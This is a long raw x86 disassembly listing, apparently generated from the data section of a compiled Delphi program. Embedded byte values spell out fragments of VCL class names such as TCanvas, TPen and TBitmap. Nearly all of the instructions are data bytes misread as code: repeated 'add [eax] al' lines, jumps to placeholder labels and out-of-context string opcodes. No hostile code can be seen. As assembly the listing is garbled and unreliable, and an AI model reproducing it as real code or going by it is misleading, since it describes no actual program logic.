jae r-xdata
popad
jae r-xdata
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + ebx * 4 ] dl
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add [ edi + ebx * 4 ] ch
inc ecx
add [ eax - 0x62 ] al
inc ecx
imul esp [ ebx + 0x61 ] 0x73620b6c
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
outsd
je r-xdata
insb
or esi [ gs : eax + 0x73 ]
inc ecx
insb
jns r-xdata
push ebp
jae r-xdata
insd
or esi [ gs : eax + 0x73 ]
outsd
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
popad
insb
dec esi
outsd
je r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
inc esp
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
or al 0x70
insd
jb r-xdata
sub [ esi ] ch
inc edx
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + 0x2d ] si
inc edx
add [ ebp + esi * 2 + 0x41 ] dl
or [ edi + 0x72 ] al
popad
jo r-xdata
outsb
pop es
jo r-xdata
outsb
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
add [ ecx ] al
add ch bh
jae r-xdata
inc ecx
outsb
je r-xdata
jae r-xdata
dec ebp
popad
jo r-xdata
inc edx
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
mov eax eax
pushad
sub al 0x42
inc edi
jb r-xdata
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
sub al 0x42
imul esp [ ebx + 0x73 ] 0xc08b0000
js r-xdata
dec ebp
jb r-xdata
and al 0x2d
add [ eax ] bh
sub eax 0x180042
add [ eax ] al
and [ ebp + 0x41 ] dh
insb
jb r-xdata
pop eax
or [ edi + 0x72 ] al
popad
jo r-xdata
nop
inc edi
outsd
outsb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
inc edx
add [ esi ] bl
inc edx
add [ eax + eax ] ah
add [ eax ] al
fsubr [ edx + eax * 2 ]
push 0x1736369
add bh bh
call [ eax + r-xdata ]
add [ eax ] al
inc edx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
jmp [ eax + 0x42 ]
jo r-xdata
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x2e
inc edx
add [ eax ] ch
inc edx
imul esp [ ebx + 0x73 ] 0xffff0001
nop
clc
sub eax 0x42
add [ eax ] eax
arpl [ esp + ecx * 2 + 0x2d ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x656a624f
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebp + eax * 2 + 0x42 ] bh
add [ edi + ebx * 4 ] ah
inc ecx
add [ edi + ebx * 4 ] ch
inc ecx
add al al
inc ebp
inc edx
imul sp [ ebp + 0x72 ] 0x1134
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sub eax 0x2d380042
imul esp [ ebx + 0x73 ] 0x422d2490
jo r-xdata
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
jmp [ ebp + eax * 2 + 0x54050042 ]
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + ebp + 0x42 ] dh
jo r-xdata
mov [ edx ] gs
inc edx
imul esp [ ebx + 0x73 ] 0x2a9c0008
inc edx
add ah ah
dec edx
inc edx
add ah ch
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
inc edx
add [ eax + eax ] bl
push r-xdata
inc eax
dec edx
inc edx
add [ edx + ecx * 2 + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040006 ] al
imul edi [ edx + 0x65 ] r-xdata
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or ecx [ edi + 0x72 ]
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
dec eax
sub al [ edx ]
mov ah 0x4a
inc edx
add [ edx + ecx * 2 + 0x10042 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x69500500
je r-xdata
sub [ edx ] eax
sbb [ eax ] al
add bh bh
cld
inc esi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
fmul [ ebp + 0x42 ]
imul esp [ ebx + 0x73 ] 0x296c0004
inc edx
add al dl
dec esp
inc edx
add al bl
dec esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc edx
add [ eax + 0x100424a ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050007 ] al
je r-xdata
popad
insd
cmp al 0x10
inc eax
add [ ebx + ecx * 2 ] dl
inc edx
add [ ebx + ecx * 2 ] bl
inc edx
add [ ecx ] al
add ah cl
dec ecx
inc edx
add ah ah
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
adc [ eax ] al
pushfd
dec ecx
inc edx
add [ ecx + ecx * 2 + 0x10042 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec eax
imul esp [ gs : edi + 0x68 ] 0x422a8c74
add [ eax ] al
jae r-xdata
inc eax
add [ eax + 0x2400424b ] cl
lahf
inc ecx
add [ edi + ebx * 4 ] ch
inc ecx
add [ eax + 0x400424b ] dh
push esp
push eax
outsb
lea eax [ eax ]
mov al 0x2f
inc edx
add [ edi ] al
add al 0x54
push eax
outsb
cwde
das
inc edx
add [ eax + 0x2d ] cl
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
call 0x4426fd6
inc esi
add ah ah
dec ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x3098c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4230 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x180042 ] ah
add [ eax ] al
fsubr [ edx + eax * 2 ]
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x4e ] dl
inc edx
add [ edi + ebx * 4 ] ah
inc ecx
add [ edi + ebx * 4 ] ch
inc ecx
add [ eax + 0x4e ] bh
sub eax [ edx ]
sbb [ eax ] al
add bh bh
cwde
dec ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x2065646f ] al
sub eax [ edx ]
lodsb [ esi ]
dec ebp
inc edx
add [ ebp + ecx * 2 + 0x10042 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
jb r-xdata
add [ eax ] al
fsubr [ edx + eax * 2 ]
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
insb
nop
cwde
das
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422f ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x1c0042 ] ah
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4231 ] al
nop
mov al 0x30
inc edx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
push ebx
je r-xdata
jo r-xdata
add al 0x24
retn
outsd
and al 0x2e
inc edx
add [ eax + eax ] cl
add bh bh
add [ eax ] al
add [ eax ] al
xor [ edx ] eax
pop es
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + esi + 0x42 ] dh
jae r-xdata
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
dec esi
cmp al 0x10
inc eax
add ah bl
dec ebp
inc edx
insb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
das
inc edx
add [ eax ] dl
add [ eax ] al
inc [ eax + 0x56 ]
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
xor [ esi + 0x42 ] dl
jae r-xdata
xor [ ecx ] 0x42
add [ eax ] al
cwde
xor [ edx ] al
dec eax
sub eax 0x20042
or [ edi + 0x72 ] al
popad
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
add [ eax ] al
push [ eax ]
push esi
inc edx
xor [ edx ] eax
xchg esp eax
jne r-xdata
je r-xdata
imul esp [ ebx + 0x73 ] 0x296c0002
inc edx
add [ eax - 0x47ffbdb1 ] dh
dec edi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
and [ eax ] 0x0
int3
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax - 0x62 ] al
inc ecx
add [ eax + ebx * 2 + 0x42 ] bh
add [ eax + 0x58 ] ch
inc edx
add [ eax + 0x7004257 ] bl
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] bl
add [ eax ] al
and [ ebp + 0x41 ] dh
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc edx
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add ah cl
push ecx
inc edx
add [ edi + ebx * 4 ] ah
inc ecx
add [ edi + ebx * 4 ] ch
inc ecx
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
pop esp
xor [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x42
add ah cl
push eax
inc edx
add ah dl
push eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul esp [ ebx + 0x73 ] 0x30ac0004
inc edx
add [ eax + eax ] dl
add bh bh
dec esp
push esi
inc edx
add [ ecx ] al
add [ eax ] al
sub_42329a
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] cl
inc edx
add [ eax + 0x33 ] dl
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] dl
jbe r-xdata
xor [ eax + eax * 2 ] 0x0
hlt
add [ eax - 0x1bffbfb8 ] bl
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esi + ebx * 4 ] dl
inc ecx
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebp + ebp * 2 + 0x42 ] bl
add [ eax - 0x62 ] al
inc ecx
add [ eax + 0x41 ] dh
add ah ch
insb
inc edx
add [ eax - 0x57ffbfcc ] al
insd
inc edx
add [ eax - 0x7fffbfcc ] al
xor al 0x40
add ah dh
outsb
inc edx
add al bh
outsb
inc edx
add [ eax - 0x7fffbfcc ] al
outsd
inc edx
add [ eax - 0x1bffbfcc ] al
outsd
inc edx
add [ eax + esi * 2 ] al
inc edx
add [ eax + 0x14004034 ] al
jo r-xdata
arpl ax sp
xor al [ edx ]
xchg esp eax
add [ esp + ebp * 2 + 0x6f000042 ] dh
inc edx
add [ edi + ebp * 2 + 0x34800042 ] cl
inc eax
add [ eax - 0x7fffbfcc ] al
xor al 0x40
add [ eax - 0x17ffbfcc ] al
outsd
inc edx
add [ ecx ] al
add ch bh
call [ edi + ebp * 2 + 0x42 ]
add [ eax ] cl
push esp
inc edi
jb r-xdata
dec esp
int3
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
xchg ecx eax
xor eax [ edx ]
lahf
xor eax [ edx ]
test eax 0x81004233
xor eax [ edx ]
mov [ ebx ] esi
jo r-xdata
ror [ edi + 0x60 ] 0xb2
fnsave [ esi + 0x28004233 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x423438c0 ] cl
jo r-xdata
arpl [ ebp + esi * 2 + 0x72 ] si
add ah bl
ja r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
xor eax [ edx ]
xor [ ebx ] 0x33890042
imul esp [ ebx - 0x73 ] 0x33600040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
add dl cl
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
dec eax
xor al 0x42
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
cmp [ edx + eax * 2 ] dh
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_427518
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x35 ] cl
inc edx
add [ eax + eax ] ah
add [ eax ] al
cwde
xor al 0x42
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax ] ch
js r-xdata
imul esp [ ebx + 0x73 ] 0xe4900000
xor al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
xor al 0x42
add [ eax ] cl
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax + 0xc004034 ] al
push esp
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
inc esp
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xor eax 0x240042
cmp [ gs : edx + eax * 2 ] dh
add [ esi + esi * 2 + 0x41 ] dl
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax + 0x75 ] cl
inc edx
add [ eax + 0x41 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebp + ebp + 0x42 ] dh
add [ eax ] bl
add [ eax ] al
add [ edx ] al
add ch bh
int 0xb8
jpe r-xdata
jbe r-xdata
imul esp [ ebx - 0x20 ] 0x94004232
dec eax
add [ eax + edi * 2 + 0x42 ] ah
add [ esi ] cl
push esp
dec ebp
je r-xdata
add [ eax + 0x34 ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x34 ] bl
inc edx
add [ eax + 0x34 ] ch
inc edx
add [ eax + eax ] ch
add [ eax ] al
adc [ esi + 0x41 ] dh
add [ eax - 0x1bffbfb8 ] bl
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x4fffbd8e ] al
jb r-xdata
inc edx
sbb edx 0x0
aam 0x11
outsd
inc edx
add [ eax + 0x41 ] dh
add ah ch
insb
inc edx
add [ ecx + edi * 2 + 0x42 ] dh
add [ eax + 0x400426d ] ch
jpe r-xdata
inc eax
add ah ah
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x24004278 ] dh
lahf
inc ecx
add [ ebp + ebp * 2 + 0x42 ] bl
add al ah
js r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
movsb [ edi ] [ esi ]
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x36
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi ] cl
inc edx
add [ eax ] dh
add [ eax ] al
add [ edx + esi + 0x48980042 ] dl
inc edx
add [ eax + 0x7f ] ah
inc edx
add [ eax ] bl
test [ edx ] al
pushfd
test [ edx ] al
rol [ edx + eax * 2 + 0x4d540900 ] 0x1
je r-xdata
add [ edx + edi * 2 ] cl
inc edx
add [ eax + 0x7a ] dh
inc edx
add al bh
outsb
inc edx
add ah bh
jpe r-xdata
popad
nop
xor [ eax ] bh
inc edx
add [ eax ] al
jo r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x77 ] bl
inc edx
add [ ecx + ecx * 4 + 0x540c0042 ] dh
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
imul bp [ ebp - 0x75 ] 0x1cc0
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
mov eax eax
sbb al 0x36
inc edx
add ah bl
jpo r-xdata
inc eax
add al bh
cmp [ edx ] eax
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
cmp [ edx ] al
xor al 0x0
add [ eax ] al
xchg esp eax
xor al [ edx ]
cwde
dec eax
inc eax
add ah ah
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ edi + ebp * 4 ] bl
inc edx
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebp + ebp * 2 + 0x42 ] bl
add [ edi + ebp * 4 + 0x42 ] cl
add [ eax + 0x41 ] dh
add ah ch
insb
inc edx
add [ edi + ebp * 4 + 0x6da80042 ] ch
inc edx
add al dh
scasd [ edi ]
inc edx
add [ eax + esi * 4 ] bl
inc edx
add ah dh
outsb
inc edx
add al bh
outsb
inc edx
add [ eax ] dh
mov al 0x42
add [ eax + 0x3000426f ] al
mov bl 0x42
add ah ah
outsd
inc edx
add [ eax - 0x4d ] ch
inc edx
add [ ebx + esi * 4 + 0x42 ] ch
add [ eax + esi * 2 ] dl
inc edx
add al cl
scasb [ edi ]
inc edx
add [ eax ] al
outsd
inc edx
add [ edi + ebp * 2 - 0x4e8fffbe ] cl
inc edx
add [ ebx + esi * 4 - 0x4c53ffbe ] al
inc edx
add al al
mov bl 0x42
add [ eax - 0x4d ] cl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
movsb [ edi ] [ esi ]
cmp [ edx ] al
pop es
add eax 0x6f634954
outsb
xor [ eax ] bh
inc edx
add [ ebx + esi + 0x42 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
aam 0x37
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
aaa
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x67ffbdcc ] bl
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x4fffbd52 ] al
scasb [ edi ]
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
pop eax
mov [ edx ] eax
mov ah 0x89
inc edx
add [ esp + edx * 2 ] cl
imul bp [ ebp - 0x5c ] 0x4235
add [ ebx + esi + 0x42 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add [ eax + 0x6000427e ] bl
jpo r-xdata
add [ edi + edi * 2 + 0x42 ] bh
add ah ah
outsd
inc edx
add [ eax - 0x80 ] ch
inc edx
add [ eax + eax * 4 + 0x42 ] ch
add ah al
add [ edx ] sub_427868
add [ edi + 0x42 ] ch
call [ esp + edi + 0x42 ]
add [ eax ] dl
push esp
push edx
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
lea eax [ bx + si ]
call sub_4278d7
popad
jo r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
jne r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x37 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x42 ] bl
add [ eax + eax ] bh
add [ eax ] al
xchg esp eax
xor al [ edx ]
cwde
dec eax
inc eax
add ah ah
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esp + edx * 4 + 0x42 ] al
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebp + ebp * 2 + 0x42 ] bl
add [ eax + 0x74004294 ] al
mov al [ 0xffffffff96600041 ]
inc edx
add al ah
xchg esi eax
inc edx
add [ eax - 0x6bffbd93 ] ch
cdq
inc edx
add [ eax - 0x66 ] cl
inc edx
add [ eax - 0x7ffbd66 ] cl
outsb
inc edx
add al dl
fwait
inc edx
add [ edi + ebx * 4 - 0x583bffbe ] bh
inc edx
add [ eax + ebp * 4 + 0x42 ] bl
add [ eax + esi * 2 ] al
inc edx
add [ eax - 0x4bffbd56 ] bl
stosb [ edi ]
inc edx
add ah bl
xchg ebx eax
inc edx
add [ eax ] al
outsd
inc edx
add [ edi + ebp * 2 - 0x6167ffbe ] cl
inc edx
add [ ebp + ebp * 4 + 0x42 ] dh
add [ esi + ebx * 4 ] dl
inc edx
add [ ebp + ebp * 4 + 0x42 ] bh
add [ esi + ebp * 4 ] bl
inc edx
add al bh
cdq
inc edx
add [ eax - 0x66 ] bl
inc edx
add [ eax + 0x70042a6 ] cl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42376870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4236e870
add [ ebx + esi + 0x42 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi + 0x740042 ] cl
add [ eax ] al
cwde
xor al 0x42
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
imul esp [ ebx + 0x73 ] 0x36880000
inc edx
dec ebp
ror [ ecx + 0x31c289d1 ] 0xc0
popad
jb r-xdata
popad
outsb
popad
jb r-xdata
arpl [ ebp + 0x4d ] sp
push eax
call DeleteObject
cdq
dec ecx
add [ esi + eax + 0x50 ] dh
inc eax
add [ eax + 0x4239 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbdc7 ] cl
cmp [ edx ] eax
and al 0x0
add [ eax ] al
aam 0x38
inc edx
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add al bh
cmp [ edx ] eax
add [ eax ] eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_4234fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xor eax 0x240042
add [ eax ] al
cwde
xor al 0x42
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax ] ch
js r-xdata
dec eax
add [ eax + edi * 2 + 0x42 ] ah
add [ esi ] cl
push esp
dec ebp
je r-xdata
outsd
inc edx
add [ eax + 0x41 ] dh
add ah ch
insb
inc edx
add [ ecx + edi * 2 + 0x42 ] dh
add [ eax + 0x400426d ] ch
jpe r-xdata
inc eax
add ah ah
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x24004278 ] dh
lahf
inc ecx
add [ ebp + ebp * 2 + 0x42 ] bl
add al ah
js r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
movsb [ edi ] [ esi ]
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x36
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi ] cl
inc edx
add [ eax ] dh
add [ eax ] al
add [ edx + esi + 0x48980042 ] dl
inc edx
add [ eax + 0x7f ] ah
inc edx
add [ eax ] bl
test [ edx ] al
pushfd
test [ edx ] al
rol [ edx + eax * 2 + 0x4d540900 ] 0x1
je r-xdata
add [ edx + edi * 2 ] cl
inc edx
add [ eax + 0x7a ] dh
inc edx
add al bh
outsb
inc edx
add ah bh
jpe r-xdata
popad
nop
xor [ eax ] bh
inc edx
add [ eax ] al
jo r-xdata
